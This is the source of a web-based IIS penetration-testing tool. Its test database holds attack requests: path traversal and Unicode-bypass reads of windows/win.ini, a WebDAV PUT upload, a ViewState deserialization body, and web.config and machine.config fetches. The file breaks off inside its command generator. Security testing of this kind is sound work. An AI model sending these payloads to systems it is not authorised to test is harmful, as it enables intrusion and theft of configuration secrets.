<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Advanced IIS Security Testing Suite Pro v2.0</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap');
        
        * {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
        }
        
        .tech-gradient {
            background: linear-gradient(135deg, #0078d4 0%, #106ebe 100%);
        }
        
        .success-gradient {
            background: linear-gradient(135deg, #10b981 0%, #059669 100%);
        }
        
        .powershell-gradient {
            background: linear-gradient(135deg, #012456 0%, #0078d4 100%);
        }
        
        .card-hover {
            transition: all 0.3s ease;
            border: 1px solid #e5e7eb;
        }
        
        .card-hover:hover {
            border-color: #0078d4;
            box-shadow: 0 8px 25px rgba(0, 120, 212, 0.15);
            transform: translateY(-3px);
        }
        
        .test-selected {
            background: linear-gradient(135deg, #ecfdf5 0%, #f0fdf4 100%);
            border-color: #10b981;
            box-shadow: 0 4px 12px rgba(16, 185, 129, 0.15);
        }
        
        .code-output {
            font-family: 'Cascadia Code', 'Fira Code', 'Consolas', 'Monaco', monospace;
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
            color: #e2e8f0;
            line-height: 1.6;
        }
        
        .powershell-output {
            font-family: 'Cascadia Code', 'Consolas', 'Monaco', monospace;
            background: linear-gradient(135deg, #012456 0%, #001e3c 100%);
            color: #f0f9ff;
            line-height: 1.8;
        }
        
        .severity-critical { 
            color: #dc2626; 
            background: linear-gradient(135deg, #fee2e2 0%, #fecaca 100%);
            border-left: 4px solid #dc2626;
        }
        .severity-high { 
            color: #ea580c; 
            background: linear-gradient(135deg, #fed7aa 0%, #fdba74 100%);
            border-left: 4px solid #ea580c;
        }
        .severity-medium { 
            color: #ca8a04; 
            background: linear-gradient(135deg, #fef3c7 0%, #fde68a 100%);
            border-left: 4px solid #ca8a04;
        }
        .severity-low { 
            color: #059669; 
            background: linear-gradient(135deg, #ecfdf5 0%, #d1fae5 100%);
            border-left: 4px solid #059669;
        }
        
        /* Modern scrollbar */
        ::-webkit-scrollbar { width: 10px; height: 10px; }
        ::-webkit-scrollbar-track { 
            background: linear-gradient(135deg, #f1f5f9 0%, #e2e8f0 100%); 
            border-radius: 10px;
        }
        ::-webkit-scrollbar-thumb { 
            background: linear-gradient(135deg, #cbd5e1 0%, #94a3b8 100%); 
            border-radius: 10px;
            border: 2px solid #f1f5f9;
        }
        ::-webkit-scrollbar-thumb:hover { 
            background: linear-gradient(135deg, #94a3b8 0%, #64748b 100%); 
        }
        
        .loading-spinner {
            border: 3px solid #f3f4f6;
            border-top: 3px solid #0078d4;
            border-radius: 50%;
            width: 24px;
            height: 24px;
            animation: spin 1s linear infinite;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .fade-in {
            animation: fadeIn 0.5s ease-in;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .pulse-glow {
            animation: pulseGlow 2s infinite;
        }
        
        @keyframes pulseGlow {
            0%, 100% { box-shadow: 0 0 5px rgba(0, 120, 212, 0.5); }
            50% { box-shadow: 0 0 20px rgba(0, 120, 212, 0.8); }
        }
        
        .floating-button {
            position: fixed;
            bottom: 100px;
            right: 30px;
            z-index: 1000;
            animation: float 3s ease-in-out infinite;
        }
        
        @keyframes float {
            0%, 100% { transform: translateY(0px); }
            50% { transform: translateY(-10px); }
        }
        
        .powershell-btn {
            background: linear-gradient(135deg, #012456 0%, #0078d4 100%);
            color: white;
            border-radius: 20px;
            padding: 15px 25px;
            box-shadow: 0 10px 30px rgba(1, 36, 86, 0.4);
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            gap: 10px;
            font-weight: 600;
            cursor: pointer;
            border: none;
        }
        
        .powershell-btn:hover {
            transform: translateY(-2px) scale(1.05);
            box-shadow: 0 15px 40px rgba(1, 36, 86, 0.5);
        }
        
        .category-card {
            background: linear-gradient(135deg, #ffffff 0%, #f8fafc 100%);
            border: 1px solid #e2e8f0;
            border-radius: 12px;
            overflow: hidden;
        }
        
        .category-header {
            background: linear-gradient(135deg, #f8fafc 0%, #f1f5f9 100%);
            border-bottom: 1px solid #e2e8f0;
        }
        
        .test-counter {
            background: linear-gradient(135deg, #0078d4 0%, #106ebe 100%);
            color: white;
            font-weight: 600;
            font-size: 0.75rem;
            padding: 0.25rem 0.5rem;
            border-radius: 9999px;
            box-shadow: 0 2px 4px rgba(0, 120, 212, 0.3);
        }
        
        .powershell-modal {
            backdrop-filter: blur(10px);
            background: rgba(0, 0, 0, 0.7);
        }
        
        .powershell-header {
            background: linear-gradient(135deg, #012456 0%, #0078d4 100%);
            color: white;
            padding: 20px 30px;
            border-radius: 15px 15px 0 0;
        }
        
        .analysis-result {
            background: linear-gradient(135deg, #f0f9ff 0%, #e0f2fe 100%);
            border-left: 4px solid #0078d4;
            padding: 15px;
            margin: 10px 0;
            border-radius: 8px;
        }
        
        .vulnerability-found {
            background: linear-gradient(135deg, #fef2f2 0%, #fee2e2 100%);
            border-left: 4px solid #dc2626;
            padding: 15px;
            margin: 10px 0;
            border-radius: 8px;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.8; }
        }
    </style>
</head>
<body class="bg-gradient-to-br from-slate-50 to-slate-100 text-gray-900 min-h-screen">
    <!-- Header -->
    <header class="bg-white shadow-lg border-b border-gray-200 sticky top-0 z-50">
        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
            <div class="flex justify-between items-center h-20">
                <div class="flex items-center">
                    <div class="tech-gradient p-3 rounded-xl mr-4">
                        <i class="fab fa-microsoft text-2xl text-white"></i>
                    </div>
                    <div>
                        <h1 class="text-2xl font-bold bg-gradient-to-r from-blue-600 to-indigo-600 bg-clip-text text-transparent">
                            Advanced IIS Security Testing Suite Pro v2.0
                        </h1>
                        <p class="text-sm text-gray-500 font-medium">Microsoft Internet Information Services Penetration Testing Platform</p>
                    </div>
                </div>
                <div class="flex items-center space-x-6">
                    <div class="text-right">
                        <p class="text-lg font-bold text-gray-700">
                            Selected: <span id="selectedCount" class="text-blue-600 font-black">0</span>
                        </p>
                        <p class="text-sm text-gray-500">
                            Total: <span id="totalCount" class="font-semibold">0</span> tests
                        </p>
                    </div>
                    <button onclick="showStats()" class="p-3 bg-gradient-to-r from-green-500 to-green-600 text-white rounded-xl hover:shadow-lg transition-all">
                        <i class="fas fa-chart-bar text-lg"></i>
                    </button>
                    <button onclick="showHelp()" class="p-3 bg-gradient-to-r from-blue-500 to-blue-600 text-white rounded-xl hover:shadow-lg transition-all">
                        <i class="fas fa-question-circle text-lg"></i>
                    </button>
                </div>
            </div>
        </div>
    </header>

    <!-- Statistics Dashboard Modal -->
    <div id="statsModal" class="fixed inset-0 bg-black bg-opacity-50 z-50 hidden">
        <div class="flex items-center justify-center min-h-screen p-4">
            <div class="bg-white rounded-2xl shadow-2xl w-full max-w-4xl max-h-[80vh] overflow-hidden">
                <div class="bg-gradient-to-r from-blue-600 to-indigo-600 text-white px-6 py-4 flex justify-between items-center">
                    <h3 class="text-xl font-bold">📊 IIS Security Test Statistics & Analytics</h3>
                    <button onclick="closeStats()" class="text-white hover:text-gray-200">
                        <i class="fas fa-times text-xl"></i>
                    </button>
                </div>
                <div class="p-6 overflow-y-auto" style="max-height: 70vh;">
                    <div class="grid grid-cols-1 md:grid-cols-4 gap-4 mb-6">
                        <div class="stat-card">
                            <div class="text-3xl font-bold text-blue-600" id="totalTestsStat">0</div>
                            <div class="text-sm text-gray-600">Total Tests</div>
                        </div>
                        <div class="stat-card">
                            <div class="text-3xl font-bold text-red-600" id="criticalTestsStat">0</div>
                            <div class="text-sm text-gray-600">Critical</div>
                        </div>
                        <div class="stat-card">
                            <div class="text-3xl font-bold text-orange-600" id="highTestsStat">0</div>
                            <div class="text-sm text-gray-600">High</div>
                        </div>
                        <div class="stat-card">
                            <div class="text-3xl font-bold text-blue-600" id="categoriesStat">0</div>
                            <div class="text-sm text-gray-600">Categories</div>
                        </div>
                    </div>
                    <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
                        <div class="bg-white p-4 rounded-xl border">
                            <h4 class="font-semibold mb-4">Severity Distribution</h4>
                            <canvas id="severityChart" width="300" height="200"></canvas>
                        </div>
                        <div class="bg-white p-4 rounded-xl border">
                            <h4 class="font-semibold mb-4">Category Distribution</h4>
                            <canvas id="categoryChart" width="300" height="200"></canvas>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Quick Actions & Presets -->
    <div class="bg-white shadow-sm border-b border-gray-200">
        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-4">
            <div class="flex flex-wrap gap-3 items-center justify-between">
                <div class="flex flex-wrap gap-2">
                    <button onclick="selectPreset('fingerprint')" class="px-4 py-2 bg-gradient-to-r from-indigo-500 to-indigo-600 text-white rounded-lg hover:shadow-lg transition text-sm font-semibold">
                        <i class="fab fa-microsoft mr-2"></i>IIS Fingerprinting
                    </button>
                    <button onclick="selectPreset('webdav')" class="px-4 py-2 bg-gradient-to-r from-purple-500 to-purple-600 text-white rounded-lg hover:shadow-lg transition text-sm font-semibold">
                        <i class="fas fa-folder-open mr-2"></i>WebDAV Attacks
                    </button>
                    <button onclick="selectPreset('traversal')" class="px-4 py-2 bg-gradient-to-r from-blue-500 to-blue-600 text-white rounded-lg hover:shadow-lg transition text-sm font-semibold">
                        <i class="fas fa-route mr-2"></i>Path Traversal
                    </button>
                    <button onclick="selectPreset('viewstate')" class="px-4 py-2 bg-gradient-to-r from-red-500 to-red-600 text-white rounded-lg hover:shadow-lg transition text-sm font-semibold">
                        <i class="fas fa-code mr-2"></i>ViewState Exploits
                    </button>
                    <button onclick="selectPreset('critical')" class="px-4 py-2 bg-gradient-to-r from-red-600 to-red-700 text-white rounded-lg hover:shadow-lg transition text-sm font-semibold">
                        <i class="fas fa-exclamation-triangle mr-2"></i>Critical CVEs
                    </button>
                    <button onclick="selectPreset('config')" class="px-4 py-2 bg-gradient-to-r from-orange-500 to-orange-600 text-white rounded-lg hover:shadow-lg transition text-sm font-semibold">
                        <i class="fas fa-cog mr-2"></i>Config Exposure
                    </button>
                    <button onclick="selectPreset('comprehensive')" class="px-4 py-2 bg-gradient-to-r from-gray-700 to-gray-800 text-white rounded-lg hover:shadow-lg transition text-sm font-semibold">
                        <i class="fas fa-shield-check mr-2"></i>Full IIS Suite
                    </button>
                </div>
                <div class="flex gap-3">
                    <button onclick="selectAll()" class="px-4 py-2 text-gray-700 bg-gray-100 hover:bg-gray-200 rounded-lg transition text-sm font-semibold">
                        <i class="fas fa-check-square mr-2"></i>Select All
                    </button>
                    <button onclick="clearAll()" class="px-4 py-2 text-gray-700 bg-gray-100 hover:bg-gray-200 rounded-lg transition text-sm font-semibold">
                        <i class="fas fa-times mr-2"></i>Clear All
                    </button>
                </div>
            </div>
        </div>
    </div>

    <!-- Main Content -->
    <main class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
        <!-- Configuration Panel -->
        <div class="bg-white rounded-2xl shadow-xl border border-gray-200 mb-8 overflow-hidden">
            <div class="tech-gradient px-6 py-4">
                <h2 class="text-xl font-bold text-white flex items-center">
                    <i class="fas fa-cog text-white mr-3"></i>IIS Target Configuration & Settings
                </h2>
            </div>
            <div class="p-6">
                <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
                    <div>
                        <label class="block text-sm font-bold text-gray-700 mb-2">🎯 Target IIS URL</label>
                        <input type="text" id="targetUrl" value="https://target-iis.example.com" 
                               class="w-full px-4 py-3 border-2 border-gray-300 rounded-xl focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all">
                    </div>
                    <div>
                        <label class="block text-sm font-bold text-gray-700 mb-2">🔗 Proxy (Optional)</label>
                        <input type="text" id="proxyUrl" placeholder="http://127.0.0.1:8080" 
                               class="w-full px-4 py-3 border-2 border-gray-300 rounded-xl focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all">
                    </div>
                    <div>
                        <label class="block text-sm font-bold text-gray-700 mb-2">📄 Output Format</label>
                        <select id="outputFormat" class="w-full px-4 py-3 border-2 border-gray-300 rounded-xl focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all">
                            <option value="curl-pure">🔥 Pure cURL</option>
                            <option value="python">🐍 Python Script</option>
                            <option value="python-async">⚡ Python Async</option>
                            <option value="burp">🔧 Burp Suite</option>
                            <option value="bash">📜 Bash Script</option>
                            <option value="powershell">💻 PowerShell</option>
                            <option value="nuclei">🎯 Nuclei Templates</option>
                            <option value="raw">📝 Raw HTTP</option>
                        </select>
                    </div>
                </div>
            </div>
        </div>

        <!-- Advanced Search and Filter -->
        <div class="bg-white rounded-2xl shadow-xl border border-gray-200 mb-8 overflow-hidden">
            <div class="bg-gradient-to-r from-blue-500 to-blue-600 px-6 py-4">
                <h2 class="text-xl font-bold text-white flex items-center">
                    <i class="fas fa-filter text-white mr-3"></i>Advanced Search & Filtering
                </h2>
            </div>
            <div class="p-6">
                <div class="grid grid-cols-1 md:grid-cols-4 gap-4">
                    <div class="md:col-span-2">
                        <div class="relative">
                            <i class="fas fa-search absolute left-4 top-4 text-gray-400 text-lg"></i>
                            <input type="text" id="searchBox" placeholder="Search IIS attacks, CVEs, techniques..." 
                                   onkeyup="filterTests()"
                                   class="w-full pl-12 pr-4 py-3 border-2 border-gray-300 rounded-xl focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all">
                        </div>
                    </div>
                    <div>
                        <select id="categoryFilter" onchange="filterTests()" 
                                class="w-full px-4 py-3 border-2 border-gray-300 rounded-xl focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all">
                            <option value="">🗂️ All Categories</option>
                        </select>
                    </div>
                    <div>
                        <select id="severityFilter" onchange="filterTests()"
                                class="w-full px-4 py-3 border-2 border-gray-300 rounded-xl focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all">
                            <option value="">⚡ All Severities</option>
                            <option value="critical">🔴 Critical</option>
                            <option value="high">🟠 High</option>
                            <option value="medium">🟡 Medium</option>
                            <option value="low">🟢 Low</option>
                        </select>
                    </div>
                </div>
                <div class="mt-4 flex flex-wrap gap-2" id="activeFilters">
                    <!-- Active filters will be shown here -->
                </div>
            </div>
        </div>

        <!-- Test Categories -->
        <div id="testContainer" class="space-y-6">
            <!-- Categories will be inserted here -->
        </div>

        <!-- Generate Button -->
        <div class="fixed bottom-8 right-8">
            <button onclick="generateCommands()" 
                    class="bg-gradient-to-r from-blue-600 to-indigo-600 text-white px-8 py-4 rounded-2xl shadow-2xl hover:shadow-3xl transition-all duration-300 flex items-center font-bold text-lg pulse-glow">
                <i class="fas fa-terminal mr-3 text-xl"></i>Generate IIS Tests
                <span id="selectedBadge" class="ml-3 bg-white text-blue-600 px-3 py-1 rounded-full text-sm font-black">0</span>
            </button>
        </div>

        <!-- Floating PowerShell Button -->
        <div class="floating-button">
            <button onclick="generatePowerShellAdvanced()" class="powershell-btn">
                <i class="fab fa-windows text-xl"></i>
                <span>PowerShell Scanner</span>
                <span id="psBadge" class="bg-white text-blue-900 px-2 py-1 rounded-full text-xs font-bold">0</span>
            </button>
        </div>
    </main>

    <!-- Output Modal -->
    <div id="outputModal" class="fixed inset-0 bg-black bg-opacity-50 z-50 hidden">
        <div class="flex items-center justify-center min-h-screen p-4">
            <div class="bg-white rounded-2xl shadow-2xl w-full max-w-6xl max-h-[90vh] overflow-hidden">
                <div class="bg-gradient-to-r from-blue-600 to-indigo-600 text-white px-6 py-4 flex justify-between items-center">
                    <h3 class="text-xl font-bold">🚀 Generated IIS Attack Commands</h3>
                    <div class="flex gap-3">
                        <button onclick="copyCommands()" class="px-4 py-2 bg-white bg-opacity-20 text-white rounded-lg hover:bg-opacity-30 transition text-sm font-semibold">
                            <i class="fas fa-copy mr-2"></i>Copy All
                        </button>
                        <button onclick="downloadCommands()" class="px-4 py-2 bg-white bg-opacity-20 text-white rounded-lg hover:bg-opacity-30 transition text-sm font-semibold">
                            <i class="fas fa-download mr-2"></i>Download
                        </button>
                        <button onclick="closeModal()" class="text-white hover:text-gray-200">
                            <i class="fas fa-times text-xl"></i>
                        </button>
                    </div>
                </div>
                <div class="p-6 overflow-y-auto" style="max-height: 75vh;">
                    <pre id="outputContent" class="code-output p-6 rounded-xl text-sm overflow-x-auto"></pre>
                </div>
            </div>
        </div>
    </div>

    <!-- PowerShell Output Modal -->
    <div id="powershellModal" class="fixed inset-0 powershell-modal z-50 hidden">
        <div class="flex items-center justify-center min-h-screen p-4">
            <div class="bg-white rounded-2xl shadow-2xl w-full max-w-7xl max-h-[95vh] overflow-hidden">
                <div class="powershell-header flex justify-between items-center">
                    <div class="flex items-center gap-3">
                        <i class="fab fa-windows text-3xl"></i>
                        <div>
                            <h3 class="text-2xl font-bold">PowerShell Advanced IIS Scanner</h3>
                            <p class="text-blue-100 text-sm">Non-Admin • Detailed Analysis • Real Vulnerability Detection</p>
                        </div>
                    </div>
                    <div class="flex gap-3">
                        <button onclick="copyPowerShell()" class="px-5 py-2 bg-white bg-opacity-20 text-white rounded-lg hover:bg-opacity-30 transition text-sm font-semibold">
                            <i class="fas fa-copy mr-2"></i>Copy Script
                        </button>
                        <button onclick="downloadPowerShell()" class="px-5 py-2 bg-white bg-opacity-20 text-white rounded-lg hover:bg-opacity-30 transition text-sm font-semibold">
                            <i class="fas fa-download mr-2"></i>Download .ps1
                        </button>
                        <button onclick="closePowerShellModal()" class="text-white hover:text-gray-200">
                            <i class="fas fa-times text-2xl"></i>
                        </button>
                    </div>
                </div>
                <div class="p-6 overflow-y-auto" style="max-height: 80vh;">
                    <div class="mb-4 bg-blue-50 p-4 rounded-lg border border-blue-200">
                        <h4 class="font-bold text-blue-900 mb-2">📋 Quick Instructions:</h4>
                        <ol class="text-sm text-blue-800 space-y-1">
                            <li>1. Copy the entire script below</li>
                            <li>2. Open PowerShell (no admin required)</li>
                            <li>3. Paste and press Enter to run</li>
                            <li>4. Review detailed vulnerability analysis</li>
                        </ol>
                    </div>
                    <pre id="powershellContent" class="powershell-output p-6 rounded-xl text-sm overflow-x-auto"></pre>
                </div>
            </div>
        </div>
    </div>

    <script>
        // Comprehensive IIS Security Test Database
        const testDatabase = {
            "IIS Fingerprinting & Version Detection": {
                icon: "fab fa-microsoft",
                tests: [
                    {
                        name: "IIS Server Header Detection",
                        description: "Detect IIS version via Server header",
                        method: "GET",
                        headers: {},
                        severity: "low",
                        path: "/"
                    },
                    {
                        name: "IIS Error Page Fingerprinting",
                        description: "Trigger IIS error pages to identify version and configuration",
                        method: "GET",
                        headers: {},
                        severity: "low",
                        path: "/nonexistent_iis_test_path"
                    },
                    {
                        name: "IIS Welcome Page Detection",
                        description: "Detect default IIS welcome page",
                        method: "GET",
                        headers: {},
                        severity: "low",
                        path: "/iisstart.htm"
                    },
                    {
                        name: "IIS Admin Page Detection",
                        description: "Check for IIS admin interface",
                        method: "GET",
                        headers: {},
                        severity: "medium",
                        path: "/iisadmin/"
                    },
                    {
                        name: "ASP.NET Detection",
                        description: "Detect ASP.NET framework and version",
                        method: "GET",
                        headers: {},
                        severity: "low",
                        path: "/trace.axd"
                    }
                ]
            },
            "WebDAV Attacks": {
                icon: "fas fa-folder-open",
                tests: [
                    {
                        name: "WebDAV OPTIONS Detection",
                        description: "Check for WebDAV support via OPTIONS method",
                        method: "OPTIONS",
                        headers: {},
                        severity: "medium",
                        path: "/"
                    },
                    {
                        name: "WebDAV PROPFIND Method",
                        description: "Use PROPFIND to enumerate WebDAV resources",
                        method: "PROPFIND",
                        headers: {"Depth": "1", "Content-Type": "text/xml"},
                        severity: "high",
                        path: "/",
                        body: "<?xml version=\"1.0\"?><a:propfind xmlns:a=\"DAV:\"><a:prop><a:displayname/></a:prop></a:propfind>"
                    },
                    {
                        name: "WebDAV PUT File Upload",
                        description: "Attempt to upload file via WebDAV PUT method",
                        method: "PUT",
                        headers: {"Content-Type": "text/plain"},
                        severity: "critical",
                        path: "/test_webdav_upload.txt",
                        body: "WebDAV test file upload"
                    }
                ]
            },
            "Path Traversal & Unicode Bypasses": {
                icon: "fas fa-route",
                tests: [
                    {
                        name: "Basic Path Traversal",
                        description: "Basic directory traversal using ../ sequences",
                        method: "GET",
                        headers: {},
                        severity: "high",
                        path: "/../../../windows/win.ini"
                    },
                    {
                        name: "Unicode Path Traversal",
                        description: "IIS Unicode directory traversal vulnerability",
                        method: "GET",
                        headers: {},
                        severity: "critical",
                        path: "/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini"
                    }
                ]
            },
            "ASP.NET ViewState Exploitation": {
                icon: "fas fa-code",
                tests: [
                    {
                        name: "ViewState MAC Validation Check",
                        description: "Check if ViewState MAC validation is enabled",
                        method: "POST",
                        headers: {"Content-Type": "application/x-www-form-urlencoded"},
                        severity: "high",
                        path: "/",
                        body: "__VIEWSTATE=invalid_viewstate_test&__EVENTTARGET=&__EVENTARGUMENT="
                    },
                    {
                        name: "ViewState Deserialization RCE",
                        description: "Attempt ViewState deserialization for RCE",
                        method: "POST",
                        headers: {"Content-Type": "application/x-www-form-urlencoded"},
                        severity: "critical",
                        path: "/",
                        body: "__VIEWSTATE=/wEPDwUKLTkyMTY0MDUxMg9kFgICAw9kFgICAQ8WAh4EVGV4dAUKSGVsbG8gV29ybGRkZPl8vqVaFD6YFCGqXgOiG2m6FOqzB&__EVENTVALIDATION=/wEWAwLs9MKsBwLF2+CgBAKM54rGBgPs"
                    }
                ]
            },
            "Configuration File Exposure": {
                icon: "fas fa-cog",
                tests: [
                    {
                        name: "Web.config Access",
                        description: "Attempt to access web.config file",
                        method: "GET",
                        headers: {},
                        severity: "critical",
                        path: "/web.config"
                    },
                    {
                        name: "Machine.config Access",
                        description: "Attempt to access machine.config file",
                        method: "GET",
                        headers: {},
                        severity: "critical",
                        path: "/machine.config"
                    }
                ]
            }
        };

        // Initialize counters
        let selectedTests = [];

        // Initialize the interface
        function init() {
            populateFilters();
            renderTests();
            updateCounts();
            updateStats();
        }

        // Populate filter dropdowns
        function populateFilters() {
            const categoryFilter = document.getElementById('categoryFilter');
            Object.keys(testDatabase).forEach(category => {
                const option = document.createElement('option');
                option.value = category;
                option.textContent = category;
                categoryFilter.appendChild(option);
            });
        }

        // Render all tests
        function renderTests() {
            const container = document.getElementById('testContainer');
            container.innerHTML = '';
            
            Object.keys(testDatabase).forEach(categoryName => {
                const category = testDatabase[categoryName];
                const categoryDiv = document.createElement('div');
                categoryDiv.className = 'category-card fade-in';
                categoryDiv.dataset.category = categoryName;
                
                categoryDiv.innerHTML = `
                    <div class="category-header px-6 py-4">
                        <div class="flex items-center justify-between">
                            <h3 class="text-xl font-bold text-gray-800 flex items-center">
                                <div class="tech-gradient p-2 rounded-lg mr-3">
                                    <i class="${category.icon} text-white text-lg"></i>
                                </div>
                                ${categoryName}
                            </h3>
                            <div class="flex items-center space-x-3">
                                <span class="test-counter">${category.tests.length} tests</span>
                                <button onclick="toggleCategory('${categoryName}')" class="text-gray-500 hover:text-gray-700">
                                    <i class="fas fa-chevron-down transition-transform duration-200" id="chevron-${categoryName}"></i>
                                </button>
                            </div>
                        </div>
                    </div>
                    <div class="p-6" id="content-${categoryName}">
                        <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
                            ${category.tests.map((test, index) => `
                                <div class="test-item card-hover rounded-xl p-4 cursor-pointer transition-all duration-300"
                                     data-category="${categoryName}"
                                     data-index="${index}"
                                     data-severity="${test.severity}"
                                     data-method="${test.method || 'GET'}"
                                     data-path="${test.path || '/'}"
                                     onclick="toggleTest(this)">
                                    <div class="flex items-start">
                                        <input type="checkbox" class="mt-1 mr-3 test-checkbox h-4 w-4 text-blue-600 rounded" 
                                               onclick="event.stopPropagation(); updateCounts();">
                                        <div class="flex-1">
                                            <h4 class="font-bold text-gray-900 mb-2">${test.name}</h4>
                                            <p class="text-sm text-gray-600 mb-3 leading-relaxed">${test.description}</p>
                                            <div class="flex items-center flex-wrap gap-2">
                                                <span class="text-xs px-3 py-1 rounded-full font-semibold severity-${test.severity}">
                                                    ${test.severity.toUpperCase()}
                                                </span>
                                                <span class="text-xs px-3 py-1 bg-blue-100 text-blue-700 rounded-full font-semibold">
                                                    ${test.method || 'GET'}
                                                </span>
                                                <span class="text-xs px-3 py-1 bg-gray-100 text-gray-700 rounded-full font-mono">
                                                    ${test.path || '/'}
                                                </span>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            `).join('')}
                        </div>
                    </div>
                `;
                
                container.appendChild(categoryDiv);
            });
        }

        // Toggle category visibility
        function toggleCategory(categoryName) {
            const content = document.getElementById(`content-${categoryName}`);
            const chevron = document.getElementById(`chevron-${categoryName}`);
            
            if (content.style.display === 'none') {
                content.style.display = 'block';
                chevron.style.transform = 'rotate(0deg)';
            } else {
                content.style.display = 'none';
                chevron.style.transform = 'rotate(-90deg)';
            }
        }

        // Toggle test selection
        function toggleTest(element) {
            const checkbox = element.querySelector('.test-checkbox');
            checkbox.checked = !checkbox.checked;
            element.classList.toggle('test-selected', checkbox.checked);
            updateCounts();
        }

        // Update selected counts
        function updateCounts() {
            const total = document.querySelectorAll('.test-checkbox').length;
            const selected = document.querySelectorAll('.test-checkbox:checked').length;
            
            document.getElementById('totalCount').textContent = total;
            document.getElementById('selectedCount').textContent = selected;
            document.getElementById('selectedBadge').textContent = selected;
            document.getElementById('psBadge').textContent = selected;
        }

        // Update statistics
        function updateStats() {
            const total = Object.values(testDatabase).reduce((sum, cat) => sum + cat.tests.length, 0);
            const critical = Object.values(testDatabase).reduce((sum, cat) => 
                sum + cat.tests.filter(t => t.severity === 'critical').length, 0);
            const high = Object.values(testDatabase).reduce((sum, cat) => 
                sum + cat.tests.filter(t => t.severity === 'high').length, 0);
            const categories = Object.keys(testDatabase).length;
            
            document.getElementById('totalTestsStat').textContent = total;
            document.getElementById('criticalTestsStat').textContent = critical;
            document.getElementById('highTestsStat').textContent = high;
            document.getElementById('categoriesStat').textContent = categories;
        }

        // Show statistics modal
        function showStats() {
            updateStats();
            document.getElementById('statsModal').classList.remove('hidden');
            createCharts();
        }

        // Close statistics modal
        function closeStats() {
            document.getElementById('statsModal').classList.add('hidden');
        }

        // Create charts
        function createCharts() {
            // Severity chart
            const severityCtx = document.getElementById('severityChart').getContext('2d');
            const severityData = {
                critical: 0,
                high: 0,
                medium: 0,
                low: 0
            };
            
            Object.values(testDatabase).forEach(cat => {
                cat.tests.forEach(test => {
                    severityData[test.severity]++;
                });
            });
            
            new Chart(severityCtx, {
                type: 'doughnut',
                data: {
                    labels: ['Critical', 'High', 'Medium', 'Low'],
                    datasets: [{
                        data: [severityData.critical, severityData.high, severityData.medium, severityData.low],
                        backgroundColor: ['#dc2626', '#ea580c', '#ca8a04', '#059669']
                    }]
                }
            });

            // Category chart
            const categoryCtx = document.getElementById('categoryChart').getContext('2d');
            const categories = Object.keys(testDatabase);
            const counts = categories.map(cat => testDatabase[cat].tests.length);
            
            new Chart(categoryCtx, {
                type: 'bar',
                data: {
                    labels: categories.map(cat => cat.substring(0, 15) + '...'),
                    datasets: [{
                        label: 'Tests',
                        data: counts,
                        backgroundColor: '#0078d4'
                    }]
                }
            });
        }

        // Select preset
        function selectPreset(preset) {
            clearAll();
            
            const presets = {
                fingerprint: () => document.querySelectorAll('[data-category="IIS Fingerprinting & Version Detection"]'),
                webdav: () => document.querySelectorAll('[data-category="WebDAV Attacks"]'),
                traversal: () => document.querySelectorAll('[data-category="Path Traversal & Unicode Bypasses"]'),
                viewstate: () => document.querySelectorAll('[data-category="ASP.NET ViewState Exploitation"]'),
                critical: () => document.querySelectorAll('[data-severity="critical"]'),
                config: () => document.querySelectorAll('[data-category="Configuration File Exposure"]'),
                comprehensive: () => document.querySelectorAll('.test-item')
            };
            
            const items = presets[preset]();
            items.forEach(item => {
                const checkbox = item.querySelector('.test-checkbox');
                if (checkbox) {
                    checkbox.checked = true;
                    item.classList.add('test-selected');
                }
            });
            
            updateCounts();
        }

        // Select all tests
        function selectAll() {
            document.querySelectorAll('.test-item').forEach(item => {
                const checkbox = item.querySelector('.test-checkbox');
                checkbox.checked = true;
                item.classList.add('test-selected');
            });
            updateCounts();
        }

        // Clear all selections
        function clearAll() {
            document.querySelectorAll('.test-item').forEach(item => {
                const checkbox = item.querySelector('.test-checkbox');
                checkbox.checked = false;
                item.classList.remove('test-selected');
            });
            updateCounts();
        }

        // Filter tests
        function filterTests() {
            const search = document.getElementById('searchBox').value.toLowerCase();
            const categoryFilter = document.getElementById('categoryFilter').value;
            const severityFilter = document.getElementById('severityFilter').value;
            
            document.querySelectorAll('.test-item').forEach(item => {
                const category = item.dataset.category;
                const severity = item.dataset.severity;
                const text = item.textContent.toLowerCase();
                
                let show = true;
                
                if (search && !text.includes(search)) show = false;
                if (categoryFilter && category !== categoryFilter) show = false;
                if (severityFilter && severity !== severityFilter) show = false;
                
                item.style.display = show ? 'block' : 'none';
            });
        }

        // Get selected tests
        function getSelectedTests() {
            const selected = [];
            document.querySelectorAll('.test-checkbox:checked').forEach(checkbox => {
                const item = checkbox.closest('.test-item');
                const category = item.dataset.category;
                const index = parseInt(item.dataset.index);
                const test = testDatabase[category].tests[index];
                selected.push({ category, test });
            });
            return selected;
        }

        // Generate commands
        function generateCommands() {
